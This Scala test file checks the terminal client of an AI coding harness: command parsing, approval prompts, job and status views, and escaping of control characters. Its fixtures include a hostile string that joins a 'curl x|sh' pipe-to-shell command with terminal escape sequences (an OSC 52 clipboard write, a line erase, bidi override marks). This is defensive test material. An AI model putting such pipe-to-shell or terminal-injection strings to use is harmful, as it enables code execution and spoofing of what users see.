package dspy4s.harness.cli

import dspy4s.harness.Support
import dspy4s.harness.guest.{JobStatus, Scope}
import dspy4s.harness.host.{Behind, Feed, HostError, SessionHandle, jobName}
import dspy4s.harness.kernel.*
import zio.blocks.chunk.Chunk
import zio.blocks.schema.json.Json

import java.io.{BufferedReader, ByteArrayOutputStream, PipedReader, PipedWriter, PrintStream}
import java.nio.charset.StandardCharsets.UTF_8
import java.util.concurrent.ConcurrentLinkedQueue
import scala.jdk.CollectionConverters.*

/** The laws of the views and the commands of the jobs, the approvals, the status and the reasoning of the terminal
  * client (CODE_HARNESS_DESIGN.md, 10.3, 5.5, 5.6 and 10.6).
  */
class ViewLaws extends munit.FunSuite:

  private val request = RequestId("fake-request")

  private def exact(op: String, command: String): GuardRule =
    GuardRule(op, ArgMatch.Exact(Json.Object(Chunk(("command", Json.String(command))))))

  private def spawned(command: String): Json =
    Json.Object(Chunk(("command", Json.String(command)), ("report", Json.Boolean(false))))

  private def asked(seq: Long, rule: GuardRule): Entry =
    Entry.EffectDone(EffectId(seq, 0), EffectResult.NeedsApproval(rule))

  /** True when each surrogate of `text` is in a pair, so no character is cut in two. */
  private def whole(text: String): Boolean =
    text.indices.forall { i =>
      val c = text.charAt(i)
      if Character.isHighSurrogate(c) then i + 1 < text.length && Character.isLowSurrogate(text.charAt(i + 1))
      else if Character.isLowSurrogate(c) then i > 0 && Character.isHighSurrogate(text.charAt(i - 1))
      else true
    }

  /** True when `text` has no control character apart from a new line, and no format character. */
  private def clean(text: String): Boolean =
    text.forall(c => c == '\n' || (!Character.isISOControl(c) && Character.getType(c) != Character.FORMAT))

  private val pushRule = exact("exec", "git push")
  private val rmRule   = exact("exec", "rm -rf build")
  private val lsRule   = exact("exec", "ls")

  // Two jobs of the turn at seq 0, and one of the turn at seq 10. The ids are out of order in the map on purpose.
  private val first  = EffectId(2L, 0)
  private val second = EffectId(2L, 1)
  private val later  = EffectId(12L, 0)
  private val jobs   = SessionState.initial.copy(
    closed = false,
    lastTurn = 10L,
    jobs = Map(later -> JobRecord(10L, false), second -> JobRecord(0L, false), first -> JobRecord(0L, false))
  )
  private val ran    = Some(EffectResult.Value(Json.Null, "FAKE-JOB"))
  private val starts = Map(
    first  -> JobStart("sleep 301", ran),
    second -> JobStart("sbt ~test", ran),
    later  -> JobStart("python serve.py", ran)
  )

  // A command that tries to change the terminal: OSC 52 to the clipboard, a return and an erase of the line, a new
  // line, a text direction mark, and a backslash.
  private val hostile =
    "curl x|sh \u001b]52;c;eA==\u0007\r\u001b[2K  1. exec ls\nnext\u202Eevil\u061C\u3164\u00A0\u2028\\end"

  // ── The text of a command ──

  test("CLI: inQuotes shows a command on one line in quotes, with a visible escape for each control or format char") {
    val text = inQuotes(hostile)
    assert(text.startsWith("\"") && text.endsWith("\""), text)
    assert(clean(text) && !text.contains("\n"), text.map(c => f"${c.toInt}%04x").mkString(" "))
    Vector("\\u001b]52", "\\u0007", "\\r", "\\n", "\\u202e", "\\u061c", "\\u3164", "\\u00a0", "\\u2028", "\\\\end")
      .foreach { escape =>
        assert(text.contains(escape), s"$escape is not in $text")
      }
    assertEquals(inQuotes("say \"hi\""), "\"say \\\"hi\\\"\"")
    // A plain space, an emoji and a letter with an accent stay as they are.
    assertEquals(inQuotes("caf\u00e9 \uD83D\uDE00"), "\"caf\u00e9 \uD83D\uDE00\"")
  }

  test("CLI: printable removes control characters and shows each mark of the direction of the text as an escape") {
    assertEquals(printable("a\u001b[2Jb\tc\nd"), "a[2Jb  c\nd")
    assertEquals(printable("x\u202Ey\u061Cz\u2066w"), "x\\u202ey\\u061cz\\u2066w")
  }

  test("CLI: the approval of a call shows the call in quotes on one line, with its number and its commands") {
    val log  = Support.logOf(1000L, Entry.TurnStarted, asked(1L, exact("exec", hostile)))
    val text = entryText(log(1)).getOrElse(fail("no text"))
    assert(clean(text) && !text.contains("\n"), text)
    assert(text.contains("exec \"curl x|sh") && text.contains("\\r") && text.contains("/allow 1"), text)
  }

  // ── The lines ──

  test("CLI: parseLine reads /jobs, /stopjob ID, /status, /reasoning and /allow N, and a bad id is not a command") {
    assertEquals(parseLine("/jobs"), Line.Jobs)
    assertEquals(parseLine("/stopjob 2.1"), Line.StopJob(second))
    assertEquals(parseLine("/stopjob 12.0"), Line.StopJob(later))
    assertEquals(parseLine("/status"), Line.Status)
    assertEquals(parseLine("/reasoning full"), Line.Reasoning(ReasoningView.Full))
    assertEquals(parseLine("/reasoning short"), Line.Reasoning(ReasoningView.Short))
    assertEquals(parseLine("/reasoning off"), Line.Reasoning(ReasoningView.Off))
    assertEquals(parseLine("/allow 57 turn"), Line.Allow(GrantLifetime.Turn, Some(57L)))
    assertEquals(parseLine("/allow 57"), Line.Allow(GrantLifetime.Once, Some(57L)))
    assertEquals(parseLine("/allow session"), Line.Allow(GrantLifetime.Session, None))
    Vector(
      "/stopjob",
      "/stopjob 2",
      "/stopjob x.0",
      "/stopjob 2.-1",
      "/stopjob 99999999999999999999.0",
      "/reasoning",
      "/reasoning all",
      "/allow 0",
      "/allow turn 2"
    ).foreach(text => assertEquals(parseLine(text), Line.Unknown(text), text))
  }

  test("CLI: /stopjob ID gives StopJobs(One) for that job, and an id that the session does not have gives an error") {
    commandsFor(Line.StopJob(second), jobs, request) match
      case Right(Vector(Command.StopJobs(JobSelector.One(job), _))) => assertEquals(job, second)
      case other                                                    => fail(other.toString)
    assert(commandsFor(Line.StopJob(EffectId(3L, 0)), jobs, request).left.exists(_.contains("/jobs")))
  }

  test("CLI: a job has one name, the cell and the number of its spawn, as the host report and the model use") {
    assertEquals(jobName(second), "2.1")
    assertEquals(jobName(later), "12.0")
  }

  test("CLI: /allow N grants the call that waits as entry N, and its number does not change when other calls change") {
    val log  = Support.logOf(1000L, Entry.TurnStarted, asked(1L, pushRule), asked(2L, rmRule), asked(3L, lsRule))
    val find = (seq: Long) =>
      log.find(_.seq == seq).collect { case Logged(_, _, Entry.EffectDone(_, EffectResult.NeedsApproval(r))) => r }
    val all = SessionState.initial.copy(closed = false, pending = Set(pushRule, rmRule, lsRule))
    // The call 1 was granted, so the calls 2 and 3 keep their numbers.
    val after = all.copy(pending = Set(rmRule, lsRule))
    commandsFor(Line.Allow(GrantLifetime.Session, Some(3L)), after, request, find) match
      case Right(Vector(Command.Grant(_, rule, GrantLifetime.Session))) => assertEquals(rule, lsRule)
      case other                                                        => fail(other.toString)
    assertEquals(
      commandsFor(Line.Allow(GrantLifetime.Once, Some(1L)), after, request, find),
      Left("The call 1 does not wait any more. /status lists the pending calls.")
    )
    assertEquals(
      commandsFor(Line.Allow(GrantLifetime.Once, Some(9L)), after, request, find),
      Left("No call has the number 9. /status lists the pending calls.")
    )
    commandsFor(Line.Allow(GrantLifetime.Once, None), all, request, find) match
      case Right(grants) => assertEquals(grants.size, 3)
      case other         => fail(other.toString)
  }

  test("CLI: pendingCalls gives each pending call with the number of the last entry that asked for it") {
    val other = exact("exec", "FAKE-NOT-PENDING")
    val log   = Support.logOf(1000L, Entry.TurnStarted, asked(1L, pushRule), asked(2L, rmRule), asked(3L, other))
      :+ Logged(4L, Meta(1000L, Source.Harness, Taint.Trusted, true), asked(4L, pushRule))
    val state = SessionState.initial.copy(closed = false, pending = Set(pushRule, rmRule))
    assertEquals(pendingCalls(state, log), Vector(2L -> rmRule, 4L -> pushRule))
  }

  test("CLI: the lines that change only the client give no command, and an unknown command points to /help") {
    Vector(Line.Jobs, Line.Status, Line.Reasoning(ReasoningView.Off), Line.Help).foreach { line =>
      assertEquals(commandsFor(line, jobs, request), Right(Vector.empty), line.toString)
    }
    assert(commandsFor(Line.Unknown("/fake"), jobs, request).left.exists(_.contains("/help")))
  }

  test("CLI: the end of a turn has the text of the report of the kernel, and a reply shows only in its step") {
    val outcomes = Vector(
      TurnOutcome.Submitted(Json.String("42 lines")),
      TurnOutcome.Submitted(Json.Object(("lines", Json.Number(42)))),
      TurnOutcome.Exhausted,
      TurnOutcome.Aborted,
      TurnOutcome.Crashed,
      TurnOutcome.Failed("no model")
    )
    outcomes.foreach { outcome =>
      val log    = Support.logOf(1000L, Entry.Input(RequestId("m1"), "work", Map.empty), Entry.StepStarted(0))
      val owned  = log.head.copy(meta = log.head.meta.copy(source = Source.Controller)) +: log.tail
      val ended  = Logged(2L, log.head.meta, Entry.TurnEnded(outcome))
      val report = reports(SessionId("s1"), Source.Controller, owned :+ ended).lastOption.map(_.text)
      assert(report.nonEmpty, outcome.toString)
      assertEquals(entryText(ended), report, outcome.toString)
    }
    assertEquals(entryText(Support.logOf(1000L, Entry.TurnEnded(TurnOutcome.Replied("done"))).head), None)
  }

  test("CLI: a grant gives its lifetime in words, and the outcome of a cell is words with no Scala value") {
    val rule                                     = GuardRule("exec", ArgMatch.AnyArgs)
    def granted(lifetime: GrantLifetime): String =
      entryText(Support.logOf(1000L, Entry.Granted(RequestId("g1"), rule, lifetime)).head).getOrElse(fail("no text"))
    assert(granted(GrantLifetime.Once).startsWith("Allowed once: "), granted(GrantLifetime.Once))
    assert(granted(GrantLifetime.Turn).startsWith("Allowed for this turn: "), granted(GrantLifetime.Turn))
    assert(granted(GrantLifetime.Session).startsWith("Allowed for this session: "), granted(GrantLifetime.Session))
    // The first line of an observation, then the output of the cell.
    def observed(outcome: CellOutcome, output: String = "FAKE-OUTPUT"): Vector[String] =
      entryText(Support.logOf(1000L, Entry.Observed(output, outcome, Map.empty)).head)
        .getOrElse(fail("no text")).linesIterator.toVector
    assertEquals(observed(CellOutcome.Ok), Vector("> ok", "FAKE-OUTPUT"))
    // The output of a cell that did not compile holds the errors, so the first line does not repeat them.
    assertEquals(
      observed(CellOutcome.CompileError(Vector("-- [E172] Type Error: FAKE")), "-- [E172] Type Error: FAKE"),
      Vector("> the cell did not compile", "-- [E172] Type Error: FAKE")
    )
    assertEquals(
      observed(CellOutcome.Failed("java.lang.RuntimeException: FAKE")).head,
      "> the cell failed: java.lang.RuntimeException: FAKE"
    )
    assertEquals(observed(CellOutcome.TimedOut(30_000L)).head, "> the cell stopped: it did not end in 30 s")
    assertEquals(observed(CellOutcome.Submitted(Json.String("42 lines"))).head, "> the cell submitted: 42 lines")
    val record = observed(CellOutcome.Submitted(Json.Object(("lines", Json.Number(42))))).head
    assert(record.startsWith("> the cell submitted: {") && record.contains("lines"), record)
  }

  test("CLI: each command of the help parses to a command of the client") {
    commandHelp.foreach { (syntax, _) =>
      val sample = syntax.replace("[N] [once|turn|session]", "57 turn").replace("ID", "2.1")
        .replace(" off|short|full", " full").replace("SECONDS", "1")
      parseLine(sample) match
        case Line.Unknown(_) => fail(s"the help names $syntax, and $sample does not parse")
        case _               => ()
    }
    assert(helpText.contains("\\"), helpText)
  }

  // ── The views ──

  test("CLI: jobStarts reads the command of each spawn of the journal and the outcome of its call") {
    val log = Support.logOf(
      1000L,
      Entry.EffectStarted(first, "spawn", spawned("sleep 301")),
      Entry.EffectStarted(EffectId(2L, 2), "exec", spawned("ls")),
      Entry.EffectDone(first, EffectResult.Error("FAKE-NO-SANDBOX"))
    )
    assertEquals(jobStarts(log), Map(first -> JobStart("sleep 301", Some(EffectResult.Error("FAKE-NO-SANDBOX")))))
  }

  test("CLI: jobsText gives each job in the order of start, with its name, its status and its command") {
    val text = jobsText(jobs, starts, Map(first -> JobStatus.Exited(0), second -> JobStatus.Running))
    assertEquals(
      text.linesIterator.toVector,
      Vector(
        "2.0 exited with the code 0: \"sleep 301\"",
        "2.1 runs: \"sbt ~test\"",
        "12.0 lost with its host: \"python serve.py\""
      )
    )
    assert(jobsText(SessionState.initial, Map.empty, Map.empty).contains("no job"))
  }

  test("CLI: jobsText tells a spawn that did not start from a job that its host lost") {
    val failed = starts.updated(first, JobStart("sleep 301", Some(EffectResult.Error("FAKE-NO-SANDBOX"))))
      .updated(second, JobStart("sbt ~test", Some(EffectResult.NeedsApproval(pushRule))))
      .updated(later, JobStart("python serve.py", None))
    val lines = jobsText(jobs, failed, Map.empty).linesIterator.toVector
    assertEquals(lines.map(_.takeWhile(_ != ':')), Vector("2.0 did not start", "2.1 did not start", "12.0 starts"))
  }

  test(
    "CLI: stopNotice names each job of the stopped turn that runs with no stop mark, and the command that stops it"
  ) {
    val running = Map(first -> JobStatus.Running, second -> JobStatus.Running, later -> JobStatus.Running)
    val notice  = stopNotice(jobs, 0L, starts, running).getOrElse(fail("no notice"))
    assert(notice.contains("2.0: \"sleep 301\"") && notice.contains("2.1: \"sbt ~test\""), notice)
    assert(notice.contains("/stopjob ID") && !notice.contains("/stopall"), notice)
    assert(!notice.contains("python serve.py"), "a job of another turn is in the notice: " + notice)
    // A job with a stop mark, or a job that ended, is not in the notice.
    val marked = jobs.copy(jobs = jobs.jobs.updated(second, JobRecord(0L, true)))
    assertEquals(stopNotice(marked, 0L, starts, running.updated(first, JobStatus.Exited(0))), None)
    assertEquals(stopNotice(jobs, 0L, starts, Map.empty), None)
    val one = stopNotice(marked, 0L, starts, running).getOrElse(fail("no notice"))
    assert(one.contains("/stopjob 2.0 stops it."), one)
  }

  test("CLI: the views quote the command of a job and of a call, so a model cannot change the terminal") {
    val bad     = Map(first -> JobStart(hostile, ran))
    val running = Map(first -> JobStatus.Running)
    val state   = jobs.copy(jobs = Map(first -> JobRecord(0L, false)), pending = Set(exact("exec", hostile)))
    Vector(
      jobsText(state, bad, running),
      stopNotice(state, 0L, bad, running).getOrElse(fail("no notice")),
      statusText(state, running, Vector(7L -> exact("exec", hostile)))
    ).foreach(text => assert(clean(text) && text.contains("\\u001b]52"), text))
  }

  test("CLI: entryText names a stopped job by its name, and the selectors in words") {
    val log = Support.logOf(
      1000L,
      Entry.JobsStopRequested(JobSelector.One(later), "FAKE-REASON"),
      Entry.JobsStopRequested(JobSelector.OfLastTurn, "FAKE-REASON"),
      Entry.JobsStopRequested(JobSelector.All, "FAKE-REASON")
    )
    assertEquals(
      log.flatMap(entryText(_)),
      Vector(
        "The job 12.0 stops: FAKE-REASON.",
        "The jobs of the last turn stop: FAKE-REASON.",
        "Each job stops: FAKE-REASON."
      )
    )
  }

  test("CLI: entryText shows the start of a step, and the reasoning cut short, in full, or not at all") {
    val long = (1 to 60).map(i => s"FAKE-THOUGHT-$i: a line of the reasoning of the model").mkString("\n")
    val log  = Support.logOf(1000L, Entry.StepStarted(1), Entry.Acted(long, "FAKE-TEXT", Some("FAKE-CODE")))
    assert(entryText(log(0)).exists(_.contains("Step 2")), entryText(log(0)).toString)
    val short = entryText(log(1)).getOrElse(fail("no text"))
    assert(short.contains("FAKE-THOUGHT-1:") && !short.contains("FAKE-THOUGHT-60"), short)
    assert(short.contains("/reasoning full shows all the reasoning of the next steps"), short)
    assert(short.contains("FAKE-TEXT") && short.contains("FAKE-CODE"), short)
    val full = entryText(log(1), ReasoningView.Full).getOrElse(fail("no text"))
    assert(full.contains("FAKE-THOUGHT-60"), full)
    val off = entryText(log(1), ReasoningView.Off).getOrElse(fail("no text"))
    assert(!off.contains("FAKE-THOUGHT") && off.contains("FAKE-TEXT"), off)
  }

  test("CLI: the short reasoning never cuts a character in two") {
    val text  = "a" * 399 + "😀" + "b" * 50
    val log   = Support.logOf(1000L, Entry.Acted(text, "", None))
    val shown = entryText(log(0)).getOrElse(fail("no text"))
    assert(whole(shown), shown)
  }

  test("CLI: statusText gives the folder, where the turn stands, the pending calls with their numbers, and the jobs") {
    val state = jobs.copy(
      config = jobs.config.copy(steps = 30, scope = Scope.Directory("/fake/work")),
      position = Position.InCell(1, 5L, "FAKE-CODE"),
      pending = Set(rmRule, pushRule)
    )
    val text = statusText(
      state,
      Map(first -> JobStatus.Running, second -> JobStatus.Exited(1)),
      Vector(4L -> rmRule, 7L                -> pushRule)
    )
    assert(text.contains("/fake/work"), text)
    assert(text.contains("Step 2 of 30") && text.contains("cell"), text)
    assert(text.contains("4. exec \"rm -rf build\"") && text.contains("7. exec \"git push\""), text)
    assert(text.contains("1 of 3 jobs"), text)
    assert(statusText(SessionState.initial.copy(closed = false), Map.empty, Vector.empty).contains("No turn"))
  }

  // ── The loop ──

  test("CLI: loop prints the stop notice after a turn that a stop ended, when a job of that turn still runs") {
    val log = Support.logOf(
      1000L,
      Entry.TurnStarted,
      Entry.StepStarted(0),
      Entry.Acted("", "", Some("""spawn("sleep 301")""")),
      Entry.EffectStarted(EffectId(2L, 0), "spawn", spawned("sleep 301")),
      Entry.EffectDone(EffectId(2L, 0), EffectResult.Value(Json.Null, "FAKE-JOB")),
      Entry.Observed("", CellOutcome.Ok, Map.empty),
      Entry.StopRequested("FAKE-STOP"),
      Entry.TurnEnded(TurnOutcome.Aborted)
    )
    val state  = SessionState.initial.copy(jobs = Map(EffectId(2L, 0) -> JobRecord(0L, false)))
    val handle = LogHandle(log, state, Map(EffectId(2L, 0) -> JobStatus.Running))
    val out    = ByteArrayOutputStream()
    Cli.loop(handle, BufferedReader(PipedReader(PipedWriter())), PrintStream(out, true, UTF_8)): Unit
    val text = out.toString(UTF_8)
    assert(text.contains("2.0: \"sleep 301\"") && text.contains("/stopjob 2.0"), text)
  }

  test("CLI: loop prints /jobs and /status, runs /stopjob ID and /allow N, and filters each text that it prints") {
    val log = Support.logOf(
      1000L,
      Entry.TurnStarted,
      Entry.EffectStarted(first, "spawn", spawned(hostile)),
      asked(2L, pushRule)
    )
    val state = jobs.copy(
      position = Position.NoTurn,
      jobs = Map(first -> JobRecord(0L, false)),
      pending = Set(pushRule),
      lastTurn = 0L
    )
    val handle  = LogHandle(log, state, Map(first -> JobStatus.Running), endAfter = false)
    val console = FakeConsole(Vector("/jobs", "/status", "/stopjob 2.0", "/allow 2 turn").map(Typed.Text(_))*)
    assert(Cli.loop(handle, console, script = false))
    val text = console.printed.asScala.mkString("\n")
    assert(text.contains("2.0 runs: \"curl x|sh"), text)
    assert(text.contains("No turn") && text.contains("2. exec \"git push\""), text)
    console.printed.asScala.foreach(printed => assert(clean(printed), printed))
    handle.ran.asScala.toVector match
      case Vector(Command.StopJobs(JobSelector.One(job), _), Command.Grant(_, rule, GrantLifetime.Turn)) =>
        assertEquals(job, first)
        assertEquals(rule, pushRule)
      case other => fail(s"ran: $other")
    assertEquals(handle.sent.asScala.toVector, Vector.empty)
  }

  test("CLI: Ctrl-C during a turn sends Abort, and with no turn it prints a hint and sends nothing") {
    val inTurn = LogHandle(Vector.empty, jobs.copy(position = Position.InPolicy(0)), Map.empty, endAfter = false)
    val one    = FakeConsole(Typed.Interrupt)
    assert(Cli.loop(inTurn, one, script = false))
    inTurn.sent.asScala.toVector match
      case Vector(Command.Abort(_)) => ()
      case other                    => fail(s"sent: $other")
    val idle = LogHandle(Vector.empty, jobs.copy(position = Position.NoTurn), Map.empty, endAfter = false)
    val two  = FakeConsole(Typed.Interrupt)
    assert(Cli.loop(idle, two, script = false))
    assertEquals(idle.sent.asScala.toVector ++ idle.ran.asScala, Vector.empty)
    assert(two.printed.asScala.exists(_.contains("/quit")), two.printed.toString)
  }

  test("CLI: the loop gives the console its Ctrl-C action, so a Ctrl-C outside a read also sends Abort") {
    val inTurn  = LogHandle(Vector.empty, jobs.copy(position = Position.InPolicy(0)), Map.empty, endAfter = false)
    val console = FakeConsole(Typed.Text("/jobs"))
    // The person presses Ctrl-C after the first line, on a thread of its own, as a signal comes.
    console.whenRead(1)(() => console.interrupt())
    assert(Cli.loop(inTurn, console, script = false))
    inTurn.sent.asScala.toVector match
      case Vector(Command.Abort(_)) => ()
      case other                    => fail(s"sent: $other")
  }

  test("CLI: the loop filters a text that only its print cleans, as the echo of an unknown command") {
    val handle  = LogHandle(Vector.empty, jobs, Map.empty, endAfter = false)
    val console = FakeConsole(Typed.Text("/fake\u001b]52;c;eA==\u0007\u202Ex"))
    assert(Cli.loop(handle, console, script = false))
    assert(console.printed.asScala.exists(_.contains("/help")), console.printed.toString)
    console.printed.asScala.foreach(printed => assert(clean(printed), printed))
  }

  test("CLI: /help prints the help text") {
    val handle  = LogHandle(Vector.empty, jobs, Map.empty, endAfter = false)
    val console = FakeConsole(Typed.Text("/help"))
    assert(Cli.loop(handle, console, script = false))
    assert(console.printed.asScala.exists(_ == helpText), console.printed.toString)
  }

/** A console that gives `items` and then `End`, and keeps each text that the loop prints. `whenRead(n)` runs an action
  * after the read n, outside the read, as a Ctrl-C of a person.
  */
private final class FakeConsole(items: Typed*) extends ClientConsole:
  private val queue                          = ConcurrentLinkedQueue[Typed](items.asJava)
  val printed: ConcurrentLinkedQueue[String] = ConcurrentLinkedQueue()
  @volatile private var action: () => Unit   = () => ()
  @volatile private var after                = -1
  @volatile private var reads                = 0
  @volatile private var interrupted          = () => ()

  def whenRead(n: Int)(run: () => Unit): Unit =
    after = n
    action = run

  def interrupt(): Unit = interrupted()

  override def onInterrupt(run: () => Unit): Unit = interrupted = run

  def read(): Typed =
    reads += 1
    // The action runs on its own thread, because a Ctrl-C comes from a signal and not from the reader.
    if reads == after + 1 then
      val thread = Thread.ofPlatform().start(() => action())
      thread.join()
    Option(queue.poll()).getOrElse(Typed.End)

  def print(text: String): Unit = printed.add(text): Unit

/** A session for the laws of the views: the feed gives the entries of `log` and then ends (with `endAfter`), `read`
  * gives the entries of `log`, `send` keeps the commands in `sent`, and `run` keeps them in `ran`.
  */
private final class LogHandle(
    log     : Vector[Logged],
    fixed   : SessionState,
    statuses: Map[EffectId, JobStatus],
    endAfter: Boolean = true
) extends SessionHandle:
  val sent: ConcurrentLinkedQueue[Command] = ConcurrentLinkedQueue()
  val ran: ConcurrentLinkedQueue[Command]  = ConcurrentLinkedQueue()

  def id: SessionId                                   = SessionId("fake-log")
  def send(command: Command): Either[HostError, Unit] =
    sent.add(command): Unit
    Right(())
  def run(command: Command): Either[HostError, SessionState] =
    ran.add(command): Unit
    Right(fixed)
  def state: SessionState                 = fixed
  def jobStatus: Map[EffectId, JobStatus] = statuses
  def read(after: Long): Vector[Logged]   = log.filter(_.seq > after)
  def subscribe(capacity: Int): Feed      =
    val items: Vector[Either[Behind, Logged]] = log.map(Right(_))
    new Feed:
      private val queue = ConcurrentLinkedQueue[Either[Behind, Logged]](items.asJava)

      def poll(waitMillis: Long): Option[Either[Behind, Logged]] =
        Option(queue.poll()).orElse { Thread.sleep(waitMillis.min(50)); None }
      def ended: Boolean = endAfter && queue.isEmpty
      def close(): Unit  = ()
